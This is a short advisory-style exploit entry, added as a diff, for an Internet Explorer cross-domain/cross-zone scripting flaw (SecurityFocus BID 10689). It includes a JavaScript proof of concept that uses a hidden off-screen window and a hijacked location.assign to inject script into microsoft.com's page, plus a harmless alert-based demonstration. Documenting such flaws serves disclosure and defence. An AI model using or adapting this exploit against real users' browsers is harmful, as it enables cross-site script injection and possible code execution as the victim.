@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/10689/info
+
+A vulnerability exists in Microsoft Internet Explorer that may allow cross-domain/cross-zone scripting. 
+
+It is reported that the vulnerability presents itself due to a failure to properly validate trust relationships between method calls that are made in separate Internet Explorer windows. This may make it possible for script code to access properties of a foreign domain or Security Zone.
+
+Exploitation may permit execution of arbitrary code as the victim user.
+
+<script>
+//courtesy of Paul
+function govuln(){
+var w=window.open("javascript:setInterval(function(){try{var tempvar=opener.location.href;}catch(e){location.assign('javascript:document.innerHTML=&quot;<title>Microsoft Corporation</title>0wned&quot;');window.close();}},100)","_blank","height=10,width=10,left=10000,top=10000");
+w.location.assign=location.assign;
+location.href="http://www.microsoft.com";
+}
+govuln()
+</script>
+
+The following example was provided:
+
+<script>;
+var var1=location.assign;
+alert("Assign function of the current window:\n"+var1);
+var w=window.open("about:blank","_blank");
+var var2=w.location.assign;
+var w=alert("Assign function of the new window:\n"+var2);
+w.close();
+</script>;
+
+This will reportedly generate two alerts describing the assign().
